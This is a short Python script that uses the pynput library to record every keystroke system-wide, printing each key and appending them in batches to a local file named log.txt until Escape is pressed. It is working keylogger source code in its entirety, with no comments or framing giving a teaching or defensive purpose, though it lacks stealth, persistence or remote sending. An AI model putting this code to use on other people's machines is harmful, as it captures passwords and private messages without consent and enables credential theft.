from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key)

    if count >= 5:
        write_file()
        count = 0
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file():
    with open("log.txt", "a+") as file:
        for key in keys:
            k = str(key).replace("'", " ").strip()
            if k.find("space") > 0:
                file.write("  ")
            elif k.find("Key") == -1:
                file.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
